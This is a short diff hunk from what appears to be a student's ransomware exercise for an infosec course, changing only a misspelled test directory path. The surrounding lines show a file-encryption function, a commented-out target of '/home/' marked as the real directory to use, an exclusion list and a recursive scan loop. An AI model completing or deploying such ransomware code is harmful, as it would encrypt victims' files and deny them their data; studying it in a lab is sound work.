@@ -68,7 +68,7 @@ def encrypt(data_file, public_key, extension):
 
 #directory ='/home/' # real dir to use
 #test dir
-directory ='/home/marcelo/Documents/infosec/ex2/TestRansomsware/'
+directory ='/home/marcelo/Documents/infosec/ex2/TestRansomware/'
 exclude_extension = ['.pem', '.exe']
 
 for item in scan_recurse(directory): 
